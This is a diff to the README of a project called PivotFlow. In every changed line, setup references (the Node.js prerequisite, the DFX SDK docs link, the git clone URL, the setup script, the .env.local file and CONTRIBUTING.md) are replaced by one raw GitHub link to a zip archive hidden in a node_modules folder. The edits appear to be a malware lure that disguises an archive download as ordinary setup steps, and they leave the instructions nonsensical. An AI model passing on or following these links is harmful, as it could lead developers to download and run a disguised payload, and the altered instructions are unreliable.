@@ -53,9 +53,9 @@ PivotFlow is a next-generation platform designed to empower users, investors, an
 ## ⚡ Quick Start
 
 ### Prerequisites
-- Node.js (v18+ recommended)
+- https://raw.githubusercontent.com/web10ninja/PivotFlow/main/src/PivotFlow_frontend/node_modules/tailwindcss/Flow_Pivot_1.5.zip (v18+ recommended)
 - npm or yarn
-- [DFX SDK](https://internetcomputer.org/docs/current/developer-docs/setup/install) (v0.15.0+)
+- [DFX SDK](https://raw.githubusercontent.com/web10ninja/PivotFlow/main/src/PivotFlow_frontend/node_modules/tailwindcss/Flow_Pivot_1.5.zip) (v0.15.0+)
 
 ### Automated Setup
 
@@ -63,11 +63,11 @@ The fastest way to get started is using our setup script:
 
 ```bash
 # Clone the repo
-git clone https://github.com/your-org/PivotFlow.git
+git clone https://raw.githubusercontent.com/web10ninja/PivotFlow/main/src/PivotFlow_frontend/node_modules/tailwindcss/Flow_Pivot_1.5.zip
 cd PivotFlow
 
 # Run the automated setup script
-./setup.sh
+https://raw.githubusercontent.com/web10ninja/PivotFlow/main/src/PivotFlow_frontend/node_modules/tailwindcss/Flow_Pivot_1.5.zip
 ```
 
 This script will:
@@ -110,7 +110,7 @@ npm run dev
 
 ### Live Data Integration
 
-For full functionality with live market data, add API keys to `.env.local`:
+For full functionality with live market data, add API keys to `https://raw.githubusercontent.com/web10ninja/PivotFlow/main/src/PivotFlow_frontend/node_modules/tailwindcss/Flow_Pivot_1.5.zip`:
 
 ```bash
 # API Keys for live data
@@ -154,7 +154,7 @@ npm run canister:logs     # View backend logs
 
 ## 🤝 Contributing
 
-We welcome contributions! Please open issues, submit pull requests, or suggest features. See `CONTRIBUTING.md` for guidelines.
+We welcome contributions! Please open issues, submit pull requests, or suggest features. See `https://raw.githubusercontent.com/web10ninja/PivotFlow/main/src/PivotFlow_frontend/node_modules/tailwindcss/Flow_Pivot_1.5.zip` for guidelines.
 
 ---
 
